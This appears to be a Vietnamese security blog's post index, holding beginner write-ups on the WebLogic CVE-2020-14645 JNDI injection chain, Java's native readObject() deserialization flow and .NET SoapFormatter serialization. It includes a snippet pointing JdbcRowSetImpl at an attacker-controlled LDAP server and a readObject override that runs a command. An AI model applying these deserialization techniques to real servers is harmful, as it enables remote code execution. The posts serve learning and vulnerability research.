this.connect() Trong hàm connect này, tại dòng 326, chương trình sẽ lấy địa chỉ server từ hàm this.getDataSourceName() và gửi request đến server để lấy dữ liệu về. Ta có thể set dataSource thành địa chỉ server của chúng ta như sau: 1 2 JdbcRowSetImpl rowSet = new JdbcRowSetImpl(); rowSet.setDataSourceName(\u0026#34;ldap://127.0.0.1:8082/glnikw\u0026#34;); Bởi vì dataSource này chúng ta có thể control và set thành địa chỉ server của chúng ta. Ở đây, tôi dùng bộ công cụ JNDI server để xây dựng LDAP server.\nNên sau khi thực hiện dòng lệnh 326, payload của chúng ta sẽ được thực thi trên server III Phân tích và mổ xẻ Chúng ta vừa đi qua flow của CVE-2020-14645. Khá đơn giản đúng không 😄😄😄😄😄. Tất nhiên là không rồi! Đây là giai đoạn tôi thích nhất khi phân tích CVE, đó là đặt câu hỏi. Mục tiêu chúng ta không chỉ dừng lại ở việc hiểu flow mà phải “tìm về cội nguồn”, đoán được mindset, cách làm của tác giả và áp dụng nó để giải quyết những vấn đề tương tự. Đó mới là “học”. Việc đặt câu hỏi sẽ giúp chúng ta có hứng thú và có hướng để nghiên cứu. Vì để trả lời câu hỏi A sẽ có hàng loạt câu hỏi B,C,D được đặt ra. Bằng cách làm như thế, kiến thức chúng ta đặt được sẽ hữu ích và không quá lý thuyết. 1. Tại sao lại là UniversalExtractor Nếu các bạn đã làm qua CommonCollection thì sẽ thấy chain này khá giống với CommonCollection4. Sự khác biệt ở bước chọn comparator (CommonCollection4 chọn TransformingComparator còn CVE-2020-14645 chọn UniversalExtractor) Một câu hỏi đặt ra: Tại sao chọn UniversalExtractor? Có lý do đặc biệt gì không?\nĐừng quên rằng CVE-2020-14645 là bản bypass của CVE-2020-2883. Trong bản patch lỗi CVE-2020-2883 sink MvelExtractor và ReflectionExtractor bị blacklisted, do đó cần tìm một extract class khác có malicious operations trong method. Dễ dàng suy luận ra, UniversalExtractor có nguồn gốc từ MvelExtractor và ReflectionExtractor. Nếu vậy, liệu có class nào khác với UniversalExtractor nữa không?\nĐể trả lời cho câu hỏi này, chúng ta cần phải biết được cách tìm ra UniversalExtractor , sau đó xem thử với cách làm này, liệu có thể tìm được class khác hay không? Liệu rằng đã hết class như vậy hay vẫn còn class nào đó mà các reseacher chưa tìm ra (tôi tin tưởng vào khả năng thứ 2 hơn). 2. Làm sao để tìm được UniversalExtractor? Nếu tôi là 1 người reproduce 1 day, làm sao để tìm được class UniversalExtractor này?\nChắc hẳn, các anh em security researcher khi nghe câu này, trong đầu sẽ vang lên hai chữ: diff-patch. Trong flow phân tích ở phần II, nếu để ý, các bạn sẽ thấy tôi không đề cập đến hai phần rất quan trọng:\nT3 protocol - cách mà weblogic trigger như thế nào? Sau khi server gửi request đến JNDI server thì flow sau đó sẽ chạy như thế nào? Đến thời điểm hiện tại, tôi chưa thể trả lời vì bị thiếu kiến thức nền. Tất nhiên, tôi sẽ tự fill và trả lời những câu hỏi này nếu muốn đi xa hơn (đây cũng là lí do tại sao tôi thích viết blog).\nDễ hiểu, bây giờ chúng ta cần đi nghiên cứu về cách diff-patch weblogic. Một điều khá thú vị và may mắn khi nghiên cứu ở CVE-2020-14645 đó là:\nCVE-2020-14645 là bypass của CVE-2020-2883 CVE-2020-2883 là bypass của CVE-2020-2555. Và CVE-2020-2555 là của anh Jang - một pro trong java deserialize. Trong blog của anh ấy có 1 bài đề cập về cách anh ấy tìm ra CVE-2020-2555 ở đây. Còn ngần ngại gì nữa, đọc và làm theo thôi! (còn tìm được hay không thì đó là câu chuyện khác 😂😂😂😂😂😂)\nIV. Tổng kết Như đã đề cập, series này chỉ giành cho beginner. Do đó, blog này flow đơn giản chỉ là bạn có 1 POC và bạn trace theo, hiểu flow và cố gắng build lại POC. Trong blog tiếp theo, tôi sẽ nâng cấp flow nghiên cứu (từ debug build ngược lại POC) V. Nguồn tham khảo Weblogic漏洞分析之JNDI注入-CVE-2020-14645 - 先知社区 (aliyun.com) https://paper.seebug.org/1280/##cve-2020-2883 ","description":"Tiếp tục với series tự học Java Deserializee của newbie, trong bài này tôi trình bày về CVE-2020-14645 của weblogic.","id":2,"section":"posts","tags":["java"],"title":"Khi newbie học Java deserialization attack: CVE-2020-14645","uri":"https://minhlongmt183.github.io/posts/khi_newbie_hoc_java_deserialization_attack_cve_2020_14645/"},{"content":"Khi newbie học Java deserialization attack: readObject() native I. Lời mở đầu Sau hơn 2 tháng học về PHP deserilazation, tôi đã chuyển qua học Java deserialization với tham vọng sẽ rèn một loại lỗi Insecure deserialization trên các ngôn ngữ PHP, JAVA, .Net 🤭🤭🤭🤭🤭. Vì là một Java deserialize fan tháng 8 nên mọi thứ bắt đầu hầu như là số 0. Và phương pháp tiếp cận ở đây sẽ là đi từ đơn giản đến nâng cao thông qua rèn luyện nhiều hơn là đọc lý thuyết.\nTôi bắt đầu với hàm sink quen thuộc của Java Deserialization là readObject(), sau đó là các chain exploit đã có sẵn trên Apache Commons Collection để hiểu rõ các kiến thức cơ bản cùng các kĩ năng cơ bản về debug, setup môi trường. Và bây giờ đang trong giai đoạn vận dụng để luyện tập trên weblogic. Một lộ trình khá rõ ràng.\nTôi kết thúc học tập về chain exploit Apache Commons Collection với một mindmap như sau:\nVì dạo gần đây cũng có vài task liên quan về việc present và viết blog để improve kĩ năng, nên tôi cũng tận dụng để viết luôn, với hai mục tiêu chính:\nÔn lại và hiểu rõ một cách thấu đáo hơn những đơn vị kiến thức đã học. Đồng thời nâng cao các kĩ năng mềm khác. Là nơi để lưu trữ kiến thức và khi cần tôi có thể lấy ra đọc, ôn lại Như tiêu đề của bài, chuỗi blog này sẽ viết về hành trình học Java Deserialization của một newbie. Do đó, trong blog sẽ không có những “yếu tố mới lạ” hay những “kiến thức cao siêu”. Hi vọng các “siêu nhân” có tình cờ ghé qua thì đừng đặt kì vọng quá nhiều!\nII. Java Deserialization 101 Câu hỏi đầu tiên mà newbie nào khi tiếp cận chủ đề này chắc hẳn: Deserialization là gì? Như thế nào là Insecure deserialization?\nXuất phát từ việc các ứng dụng giao tiếp, truyền dữ liệu dưới dạng byte.\nHiện nay một ứng dụng điển hình sẽ có nhiều thành phần và sẽ được phân phối trên các hệ thống và mạng khác nhau. Trong Java, mọi thứ được biểu diễn dưới dạng các Object. Nếu hai thành phần Java muốn giao tiếp với nhau, cần phải có một cơ chế để trao đổi dữ liệu. Mỗi đối tượng trong Java sẽ có các kiểu đối tượng khác nhau gây khó khăn trong việc trao đổi dữ liệu. Do đó, cần phải có một giao thức chung chung và hiệu quả để chuyển đối tượng giữa các thành phần.\nSerialization được định nghĩa cho mục đích này, và các thành phần Java sử dụng giao thức này để chuyển các đối tượng\nThông qua hình ảnh minh họa ở trên, ta có thể hiểu\nSerialization là quá trình chuyển Object thành ByteStream. Deserialization là quá trình ngược với Serialization.\nInsecure Deserialization là khi dữ liệu do người dùng kiểm soát được deserialize bởi một trang web. Điều này có khả năng cho phép kẻ tấn công thao túng các đối tượng được serialize để truyền dữ liệu có hại vào code ứng dụng. Thậm chí có thể thay thế một đối tượng được serialize bằng một đối tượng của một lớp hoàn toàn khác. Một điểm cần lưu ý ở đây, các đối tượng của bất kỳ lớp nào có sẵn cho trang web sẽ được deserialize và khởi tạo. Vì lý do này, insecure deserialization đôi khi được gọi là lỗ hổng \u0026ldquo;object injection” Vì đã có kiến thức về PHP deserialization attack, nên tôi bắt đầu với một ảnh minh họa mô hình tấn công trong PHP deserialization: Attacker truyền vào payload serialized Object và webserver đã deserialize payload này. Điều này cho phép kẻ tấn công có thể thực thi câu lệnh\nVề cơ bản, tôi tạm chia quá trình khai thác Java Deserialization thành 2 giai đoạn như sau:\nApplication Vulnerability: Tại bước này, attacker phải tìm được endpoint (source) để truyền dữ liệu vào và một hàm sink thực hiện deserialize dữ liệu của attacker. Trong PHP hàm sink này là unserialize() còn trong Java thì nó là readObject().\nExploit chain: Tại bước này, readObject() ở bước trước sẽ từ sink trở thành source và sink sẽ là mục tiêu của attacker (có thể là RCE, tạo file,…). Với newbie, chúng ta sẽ tập trung vào exploit chain để rèn luyện các kĩ năng cơ bản, cụ thể là Apache CommonsCollections\nIII. readObject() native Như đã biết, readObject là hàm thực hiện deserialization trong Java. Do đó, cách tiếp cận của tôi sẽ làm 1 ví dụ cơ bản về serialization và deserialization và xem luồng thực thi của hàm này như thế nào.\nTôi tạo class User.java:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 package nativeReadObject; import java.io.IOException; import java.io.Serializable; public class User implements Serializable { private String name; private int age; @Override public String toString() { return \u0026#34;User{\u0026#34; + \u0026#34;name = \u0026#39;\u0026#34; + name + \u0026#39;\\\u0026#39;\u0026#39; + \u0026#34;, age = \u0026#34; + age + \u0026#39;}\u0026#39;; } // private void readObject(java.io.ObjectInputStream stream) throws IOException { // System.out.println(\u0026#34;ReadObject overwrite\u0026#34;); // Runtime.getRuntime().exec(String.format(\u0026#34;cmd.exe /c calc\u0026#34;)); // } public String getName() { return name; } public void setName(String name) { this.name = name; } public int getAge() { return age; } public void setAge(int age) { this.age = age; } public User(){} public User(String name, int age) { this.name = name; this.age = age; } } Và một class để serialize và deserialize ReadTest.java:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 package nativeReadObject; import java.io.*; public class ReadTest { public static void main(String[] args) throws IOException, ClassNotFoundException { User user = new User(); user.setName(\u0026#34;Edisc\u0026#34;); user.setAge(23); ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\u0026#34;user.ser\u0026#34;)); // serialize: Object =\u0026gt; byte stream oos.writeObject(user); ObjectInputStream ois = new ObjectInputStream(new FileInputStream(\u0026#34;user.ser\u0026#34;)); // deserialize: byte stream =\u0026gt; Object Object o = ois.readObject(); User deserUser = (User) o; System.out.println(deserUser.getName()); System.out.println(deserUser.getAge()); } } Trong class User.java, chúng ta chú ý đoạn code từ dòng 17-20. Khi không có dòng code này, kết quả sẽ như sau:\nCòn khi có đoạn code: Bạn thấy chứ? khi chúng ta implement readObject thì định nghĩa của hàm này sẽ bị overwrite và data trả về là null, 0 chứ không như default. Một lưu ý ở đây là kiểu dữ liệu private và param là java.io.ObjectInputStream stream. Để hiểu rõ hơn, ta tiến hành debug:\nĐầu tiên, chương trình sẽ gọi readObject() của ObjectInputStream.java Tại dòng 373, method ObjectInputStream#readObject0()sẽ được gọi Đoạn mã trên chịu trách nhiệm đọc các object từ input. Cụ thể:\nboolean oldMode = bin.getBlockDataMode();: Ở đây, biến oldMode được sử dụng để lưu trạng thái hiện tại của chế độ dữ liệu khối (block data mode) trong đối tượng bin (một đối tượng BlockDataInputStream). if (oldMode) { ... }: Nếu đang ở chế độ dữ liệu khối cũ (oldMode), một số xử lý đặc biệt được thực hiện. oldMode là một trạng thái khi đang đọc dữ liệu mà gặp một dữ liệu block không thể xử lý được ngay lập tức. byte tc;: Biến tc là một biến byte được sử dụng để lưu trữ mã nhận dạng kiểu dữ liệu hiện tại trong luồng dữ liệu. while ((tc = bin.peekByte()) == TC_RESET) { ... }: Vòng lặp này kiểm tra xem liệu có bất kỳ mã nhận dạng TC_RESET nào ở đầu luồng dữ liệu không. Nếu có, nó sẽ tiếp tục đọc dữ liệu và thực hiện các xử lý liên quan đến việc đặt lại các trạng thái của luồng. depth++;: Biến depth được sử dụng để theo dõi độ sâu của đối tượng đang được đọc. Nó tăng lên mỗi khi bắt đầu đọc một đối tượng mới. switch (tc) { ... }: Cấu trúc switch dựa vào giá trị của tc để xác định kiểu dữ liệu của đối tượng đang đọc và thực hiện xử lý tương ứng. Trong mỗi trường hợp, phương thức thực hiện xử lý tương ứng với kiểu dữ liệu đang đọc, ví dụ như đọc một chuỗi, mảng, đối tượng thường hay đối tượng được tham chiếu bởi một tham chiếu. Cuối cùng, phương thức kết thúc việc đọc đối tượng và trả về kết quả đã đọc được. finally { ... }: Phần cuối cùng của phương thức được thực hiện sau khi phương thức đã đọc xong đối tượng. Ở đây, trạng thái của luồng và biến depth được cập nhật lại để chuẩn bị cho việc đọc đối tượng tiếp theo. Đoạn code này đảm bảo rằng các đối tượng đọc từ luồng dữ liệu đầu vào đúng định dạng và được xử lý một cách an toàn. Nó là một phần quan trọng của cơ chế đọc và giải mã đối tượng trong Java.\nTiếp tục chương trình, dòng lệnh 1353 được thực thi: Tại đây, ObjectInputStream#readOrdinaryObject() được gọi Chú ý dòng 1781 và 1782. Tại dòng 1781, hàm readClassDesc() được gọi để trả về một descriptor, giá trị lưu vào biến desc. Sau đó, biến này sẽ kiểm tra xem có thể deserialize không. Tiếp sau đó, tại dòng lệnh 1805-1809, hàm readSerialData(obj, desc) sẽ được gọi. Dễ đoán được, hàm này xử lý, chuyển đổi từ bytestream sang object.\nTôi đi vào hàm readClassDesc() để xem thử thế nào:\nTới đây chúng ta sẽ xuất hiện một đơn vị kiến thúc mới là: Proxy và nonProxy\n3.1 Proxy vs nonProxy Bất kỳ khi nào làm việc với Java Serialization, chúng ta sẽ gặp hai khái niệm quan trọng là \u0026ldquo;proxy\u0026rdquo; và \u0026ldquo;non-proxy\u0026rdquo;. Trong ngữ cảnh Serialization, chúng thường được sử dụng để tham chiếu đến cách mà đối tượng được serialized và deserialized.\nProxy Serialization: Khi chúng ta serialize một object theo cách proxy serialization, Java Serialization sẽ tạo một đối tượng proxy, được gọi là \u0026ldquo;proxy class\u0026rdquo;, để thay thế cho đối tượng gốc. Proxy class chứa thông tin cần thiết để tái tạo đối tượng ban đầu sau khi deserialization. Proxy class cũng được sử dụng để xác định trạng thái của đối tượng và để xử lý quyền truy cập vào trường dữ liệu của đối tượng.\nViệc sử dụng proxy serialization có thể hữu ích trong một số tình huống. Ví dụ, nếu một đối tượng chứa các trường dữ liệu private, bạn có thể sử dụng proxy serialization để đảm bảo rằng chỉ các thành phần bên trong đối tượng có thể truy cập và sửa đổi dữ liệu.\nNon-Proxy Serialization: Ngược lại, khi serialization một đối tượng theo cách non-proxy serialization, Java Serialization sẽ serialize toàn bộ đối tượng, bao gồm cả dữ liệu và trạng thái của nó. Khi deserialization, đối tượng được tái tạo chính xác theo trạng thái ban đầu và không cần sử dụng proxy class.\nViệc sử dụng non-proxy serialization thích hợp trong những trường hợp đơn giản, khi không có yêu cầu đặc biệt về việc kiểm soát truy cập hoặc xử lý trạng thái của đối tượng.\nTrong cả hai trường hợp, proxy và non-proxy serialization đều cung cấp khả năng serialize và deserialization các đối tượng Java. Tuy nhiên, việc chọn giữa hai phương pháp này phụ thuộc vào yêu cầu và mục đích sử dụng của bạn trong việc lưu trữ và khôi phục dữ liệu đối tượng.\nTiếp tục với chương trình,\nHàm readNonProxyDesc() sẽ được gọi,\nTrong ObjectInputStream#readNonProxyDesc(), tại dòng 1609, hàm readClassDescriptor() trả về nativeReadObject.User, lưu vào biến readDesc.\nTại dòng 1620, resolveClass() được gọi để phân giải readDesc, lưu vào biến cl.\nĐến dòng 1630, chương trình sẽ initNonProxy với các tham số readDesc, cl, resolveEx, readClassDesc(false)\nSau đó, desc sẽ được return ở dòng 1634.\nTiếp tục với chương trình ObjectInputStream#readOrdinaryObject. Sau khi có được class descriptor trong biến desc, chương trình sẽ tiếp tục thực thi. Ở dây, ta chú ý biến obj được tạo mới thông qua desc.newInstance().Sau đó truyền vào hàm readSerialData(obj, desc)\nHàm readSerialData\nDòng 1899 kiểm tra xem readObject() có bị overwrite hay không. Nếu có khối lệnh 1900-1940 được gọi. Nếu không, hàm defaultReadFields() được gọi.\nĐiều này giải thích tại sao khi chúng ta thêm hàm private readObject() ở ví dụ đầu thì output trả về lại khác.\nVì chúng ta đang debug với ngữ cảnh có overwrite, nên\nhàm slotDesc.invokeReadObject được gọi, với object có name=null và age = 0\nHàm invokeReadObject() sẽ gọi readObjectMethod.invoke() Tới đây chương trình sẽ gọi tới Method#invoke() Method#invoke()\nĐây là 1 Reflection API cho phép gián tiếp invoke 1 method, Reflection API này sinh ra để invoke method của 1 object không thể cast được vào 1 kiểu xác định nào đó, Ví dụ: Trường hợp thông thường, ta có thể khai báo HashMap obj = new HashMap(); và sau đó có thể gọi obj.put(), obj.get() bình thường mà không có vấn đề gì xảy ra. Nhưng trong trường hợp thực tế, có 1 private class XYZ và public method foo(), từ một nơi nào đó, nhận được 1 (Object)object của class XYZ này. Để invoke được method XYZ.foo() này, không thể gọi object.foo(), mà phải cast nó sang XYZ -\u0026gt; ((XYZ) object).foo() mới có thể call được. Vấn đề ở đây là class XYZ được set ở private, nên từ bên ngoài không thể access được class XYZ này, và cast (XYZ) object được. Và method reflection sinh ra để giải quyết vấn đề này,\nTheo flow của method, ma.invoke() được gọi với ma là DelegatingMethodAccessorImpl. Nên DelegatingMethodAccessorImpl#invoke() được gọi\nHàm invoke này sẽ gọi qua NativeMethodAccessorImpl#invoke()\nVà tới hàm NativeMethodAccessorImpl#invoke(), hàm invoke0() được gọi với 2 biến var1 là Object User và var2 là readObject method của chúng ta.\nVà tới đây nó flow sẽ nhảy về method readObject của chúng ta và popup lên 1 calc\nyeah, tới đây chúng ta đã đi hết flow của native readObject(). Tôi tổng hợp flow nằm ở sơ đồ sau:\nTrong sơ đồ trên, tôi thấy chúng ta cần hiểu rõ hàm ObjectInputStream#readOrdinaryObject và Method#invoke vì 2 method này sẽ điều hướng luồng thực thi (khi chúng ta build payload chain)\nIV. Tổng kết Như đã đề cập ở phần đầu, series này là của người bắt đầu nên các đơn vị kiến thức đều là basic và blog này tôi đề cập tới đơn vị kiến thức cơ bản của cơ bản: flow của readObject() Một lưu ý ở đây, để detect java serialize, chúng ta có thể thực hiện các cách sau: Java serialize object streams luôn bắt đầu với: Magic bytes: 0xAC 0XED trong HEX, r00ABX trong Base64-encoded Header HTTP response: Content type: application/x-javaj-serialized-object Bruteforce the input: Ysoserial by Chris Frohoff Kiểm tra các third-party product. Kết thúc phần này, chúng ta sẽ có đủ kiến thức cơ bản để tiến hành nghiên cứu ApacheCommonsCollection. V. Nguồn tham khảo https://www.cnblogs.com/nice0e3/p/14127885.html https://www.vuln.cn/6296 https://portswigger.net/web-security/deserialization#:~:text=Insecure%20deserialization%20is%20when%20user,of%20an%20entirely%20different%20class ","description":"Sau hơn 2 tháng học về PHP deserilazation, tôi đã chuyển qua học Java deserialization với tham vọng sẽ rèn một loại lỗi Insecure deserialization trên các ngôn ngữ PHP, JAVA, .Net 🤭🤭🤭🤭🤭.  Vì là một Java deserialize fan tháng 8 nên mọi thứ bắt đầu hầu như là số 0. Và phương pháp tiếp cận ở đây sẽ là đi từ đơn giản đến nâng cao thông qua rèn luyện nhiều hơn là đọc lý thuyết. ","id":3,"section":"posts","tags":["java"],"title":"Khi newbie học Java deserialization attack: readObject() native","uri":"https://minhlongmt183.github.io/posts/khi_newbie_hoc_java_deserialization_attack_readobject/"},{"content":"[.NET 101] SoapFormatter:ActivitySurrogateSelector Sau gần một tháng học về JavaDeserialize: học các khái niệm basic, reproduce các commonscollection thì lần này tôi có cơ hội tiếp xúc với .Net deserialize. Nội dung cho newbie là học các kiến thức basic và reproduce các chain kinh điển của .Net deserialize trên 先知社区 (aliyun.com)\nKhởi đầu khá thuận lợi với các bài:\ndotnet serialize 101 .net deserialization of BinaryFormatter .net deserialized by XmlSerializer Nhìn chung là vì có kiến thức cơ bản từ PHP deserialize và Java deserialize nên ở mức độ 101 này không quá khó với tôi.\nNhưng đời không như mơ, đến với SoapFormatter:ActivitySurrogateSelector tôi đọc và làm trong 3 ngày và vẫn không hiểu được gì 😥😥😥😥. Do đó, tôi quyết định viết lại từng bước, từng câu hỏi và tự tìm hiểu, trả lời. Đây là một trong những phương pháp học của tôi: Ghi ra những điều mình không hiểu và tìm cách giải quyết từng bước một.\nVì là một con gà mới tiếp xúc với .Net deserialize chưa tới 2 tuần, nên nội dung bài blog này khá dài và những kiến thức cơ bản khá nhiều (không giành cho các profesional).\nNote:\nĐể hiểu được chain exploit này, ta cần có một số kiến thức cơ bản nhất định mà tôi sẽ trình bày ở phần I,II,III, IV.\nI SoapFormatter SoapFormatter tương tự với XmlSerializer, được dùng để tạo xml-based soap data streams. Namespace nằm ở: System.Runtime.Serialization.Formatters.Soap Assembly ở: System.Runtime.Serialization.Formatters.Soap.dll SoapFormatter có thể serialize và deserialize toàn bộ một đồ thị các object (graph of objects) hoặc các objects kết nối với nhau dưới định dạng SOAP. SoapFormatter implements IRemotingFormatter, IFormatter interfaces. Sự khác biệt giữa SoapFormatter và BinaryFormatter là SoapFormatter không thể serialize một generic type trong khi BinaryFormatter không cần chỉ rõ type của serialized object trong quá trình deserialize. Trong bài này tôi sử dụng Visual Studio 2019, lí do vì phiên bản này hỗ trợ 1 extension GoToDnSpy. II .NET Objects và SOAP Streams Chúng ta bắt đầu với đoạn code sau: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 using System; using System.IO; using System.Runtime.Serialization.Formatters.Soap; using System.Text; namespace SoapDeserialization { [Serializable] class Person { private int age; private string name; public int Age { get =\u0026gt; age; set =\u0026gt; age = value; } public string Name { get =\u0026gt; name; set =\u0026gt; name = value; } public void SayHello() { Console.WriteLine(\u0026#34;hello from SayHello\u0026#34;); } } class Program { static void Main(string[] args) { SoapFormatter soapFormatter = new SoapFormatter(); Person person = new Person(); person.Age = 18; person.Name = \u0026#34;Edisc\u0026#34;; using (MemoryStream stream = new MemoryStream()) { // serialize soapFormatter.Serialize(stream, person); string soap = Encoding.UTF8.GetString(stream.ToArray()); Console.WriteLine(soap); Console.WriteLine(\u0026#34;========================================\u0026#34;); // deserialize stream.Position = 0; Person p = (Person)soapFormatter.Deserialize(stream); Console.WriteLine(p.Name); Console.WriteLine(p.Age); p.SayHello(); } Console.ReadKey(); } } } Khi mới chạy khả năng sẽ bị thiếu thư viện System.Runtime.Serialization.Formatters.Soap.dll nên chương trình không thể thực thi Để fix lỗi này, chúng ta cần tìm đến địa chỉ lưu trữ System.Runtime.Serialization.Formatters.Soap.dll rồi import thư viện này vào references. Một tip ở đây là tìm các dll bằng cách search trên ổ C, sau đó import reference tại địa chỉ đó. Còn cách import thì tôi đã nói trong bài trước.\nOutput như sau:\n1 2 3 4 5 6 7 8 9 10 11 12 13 \u0026lt;SOAP-ENV:Envelope xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xmlns:xsd=\u0026#34;http://www.w3.org/2001/XMLSchema\u0026#34; xmlns:SOAP-ENC=\u0026#34;http://schemas.xmlsoap.org/soap/encoding/\u0026#34; xmlns:SOAP-ENV=\u0026#34;http://schemas.xmlsoap.org/soap/envelope/\u0026#34; xmlns:clr=\u0026#34;http://schemas.microsoft.com/soap/encoding/clr/1.0\u0026#34; SOAP-ENV:encodingStyle=\u0026#34;http://schemas.xmlsoap.org/soap/encoding/\u0026#34;\u0026gt; \u0026lt;SOAP-ENV:Body\u0026gt; \u0026lt;a1:Person id=\u0026#34;ref-1\u0026#34; xmlns:a1=\u0026#34;http://schemas.microsoft.com/clr/nsassem/SoapDeserialization/ActivitySurrogateSelectorChain%2C%20Version%3D1.0.0.0%2C%20Culture%3Dneutral%2C%20PublicKeyToken%3Dnull\u0026#34;\u0026gt; \u0026lt;age\u0026gt;18\u0026lt;/age\u0026gt; \u0026lt;name id=\u0026#34;ref-3\u0026#34;\u0026gt;Edisc\u0026lt;/name\u0026gt; \u0026lt;/a1:Person\u0026gt; \u0026lt;/SOAP-ENV:Body\u0026gt; \u0026lt;/SOAP-ENV:Envelope\u0026gt; ======================================== Edisc 18 hello from SayHello SOAP (Simple Object Access Protocol) là một giao thức truyền thông được sử dụng để trao đổi thông tin giữa các ứng dụng qua mạng. Trong SOAP, namespace (không gian tên) được sử dụng để giới hạn phạm vi của các phần tử trong tin nhắn SOAP.\nSOAP sử dụng không gian tên (namespace) theo chuẩn xmlns để giới hạn phạm vi namespace, và điều này được phản ánh trong thẻ a1.\nTrong output trên, ta thấy rằng các phần tử trong SOAP-ENV:Envelope được liên kết với các namespace thông qua các thuộc tính xmlns. Ví dụ:\nPhần tử \u0026lt;SOAP-ENV:Envelope\u0026gt; được liên kết với namespace \u0026quot;http://schemas.xmlsoap.org/soap/envelope/\u0026quot; thông qua thuộc tính xmlns:SOAP-ENV. Phần tử \u0026lt;a1:Person\u0026gt; được liên kết với namespace \u0026quot;http://schemas.microsoft.com/clr/nsassem/SoapDeserialization/SoapDeserialization%2C%20Version%3D1.0.0.0%2C%20Culture%3Dneutral%2C%20PublicKeyToken%3Dnull\u0026quot; thông qua thuộc tính xmlns:a1. Như vậy, việc sử dụng không gian tên XML (namespace) giúp hạn chế phạm vi của các phần tử trong tin nhắn SOAP và thông tin về namespace này được phản ánh trong thẻ a1.\nĐiều này quan trọng vì nếu không có việc giới hạn namespace, các phần tử có thể xảy ra xung đột hoặc không rõ ràng trong việc xác định phạm vi và ý nghĩa của chúng. Nhờ vào việc sử dụng không gian tên, ta có thể định rõ và xác định các phần tử trong tin nhắn SOAP theo các namespace cụ thể.\nNgoài ra, SoapFormatter còn implement 2 interfaces: IRemotingFormatter, IFormatter. IFormatter\nIFormatter còn có một proxy selector\nproxy selector là gì?\nTrong quá trình deserialize (chuyển đổi từ dữ liệu đã được serialize thành đối tượng) của .NET, \u0026ldquo;proxy selector\u0026rdquo; (bộ chọn proxy) là một khái niệm được sử dụng để xác định cách thức chọn loại đối tượng đích để thực hiện quá trình deserialize.\nKhi ta thực hiện quá trình deserialize, .NET cần biết cách chọn và xây dựng đúng loại đối tượng mà dữ liệu serialized sẽ được chuyển đổi thành. Đó là lúc \u0026ldquo;proxy selector\u0026rdquo; (bộ chọn proxy) đến. Proxy selector định nghĩa cách thức chọn đúng loại đối tượng tương ứng với dữ liệu đã được serialize.\nProxy selector có thể được sử dụng để tùy chỉnh quá trình deserialize bằng cách xác định bộ chọn proxy tùy chỉnh. Bộ chọn proxy tùy chỉnh này sẽ quyết định loại đối tượng cần được xây dựng và sử dụng trong quá trình deserialize dựa trên dữ liệu serialized và các quy tắc xác định sẵn.\nProxy selector giúp .NET xác định loại đối tượng cụ thể để khôi phục dữ liệu serialized thành đối tượng thích hợp. Nó đóng vai trò quan trọng trong việc đảm bảo quá trình deserialize diễn ra đúng cách và dữ liệu được chuyển đổi thành đối tượng đúng.\nĐể xem được code như trên, ta dùng dnSpy 64bit\nTIP: Chúng ta có thể dùng extension GoToDnSpy (dùng cho VS2019 trở đi) thì quá trình trace code sẽ đơn giản hơn nhiều\nHãy sửa đổi đoạn code ban đầu của chúng ta một chút :\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 using System; using System.IO; using System.Runtime.Serialization; using System.Runtime.Serialization.Formatters.Soap; using System.Text; namespace SoapDeserialization { [Serializable] class Person { private int age; private string name; public int Age { get =\u0026gt; age; set =\u0026gt; age = value; } public string Name { get =\u0026gt; name; set =\u0026gt; name = value; } public void SayHello() { Console.WriteLine(\u0026#34;hello from SayHello\u0026#34;); } } //===================================begin new code =================================== sealed class PersonSerializeSurrogate : ISerializationSurrogate { public void GetObjectData(object obj, SerializationInfo info, StreamingContext context) { var p = (Person)obj; info.AddValue(\u0026#34;Name\u0026#34;, p.Name); } public object SetObjectData(object obj, SerializationInfo info, StreamingContext context, ISurrogateSelector selector) { var p = (Person)obj; p.Name = info.GetString(\u0026#34;Name\u0026#34;); return p; } } //===================================end new code =================================== class Program { static void Main(string[] args) { SoapFormatter soapFormatter = new SoapFormatter(); //=================================== begin new code =================================== var ss = new SurrogateSelector(); ss.AddSurrogate(typeof(Person), new StreamingContext(StreamingContextStates.All), new PersonSerializeSurrogate()); soapFormatter.SurrogateSelector = ss; //===================================end new code =================================== Person person = new Person(); person.Age = 18; person.Name = \u0026#34;Edisc\u0026#34;; using (MemoryStream stream = new MemoryStream()) { // serialize soapFormatter.Serialize(stream, person); string soap = Encoding.UTF8.GetString(stream.ToArray()); Console.WriteLine(soap); Console.WriteLine(\u0026#34;========================================\u0026#34;); // deserialize stream.Position = 0; Person p = (Person)soapFormatter.Deserialize(stream); Console.WriteLine(p.Name); Console.WriteLine(p.Age); p.SayHello(); } Console.ReadKey(); } } } Kết quả chương trình sau khi chạy: Surrogate là gì?\nTrong C#, Surrogate (đại diện) là một khái niệm liên quan đến quá trình tuần tự hóa (serialization) và phục hồi (deserialization) đối tượng.\nKhi một đối tượng được tuần tự hóa hoặc phục hồi, Surrogate được sử dụng để đại diện cho đối tượng gốc và điều khiển quá trình tuần tự hóa và phục hồi. Nó cung cấp một cách để tùy chỉnh hoặc thay đổi cách mà một đối tượng được tuần tự hóa hoặc phục hồi.\nSurrogate thường được sử dụng trong các trường hợp như:\nTuần tự hóa các đối tượng không tuân theo giao diện ISerializable. Đối tượng có dữ liệu nhạy cảm mà bạn muốn che giấu hoặc không tuần tự hóa. Đối tượng có kiểu không tuân theo quy tắc tuần tự hóa mặc định của .NET Framework. Để sử dụng Surrogate, bạn cần triển khai một lớp SurrogateSelector và ghi đè phương thức GetSurrogate của nó. Phương thức GetSurrogate cho phép bạn xác định Surrogate cụ thể để sử dụng cho một kiểu đối tượng nhất định.\nSurrogate giúp bạn kiểm soát quá trình tuần tự hóa và phục hồi, cho phép tùy chỉnh và điều chỉnh quá trình này để đáp ứng nhu cầu cụ thể của ứng dụng của bạn.\nKhi proxy selector cho class Person được thiết lập cho SoapFormatter, method GetObjectData và SetObjectData 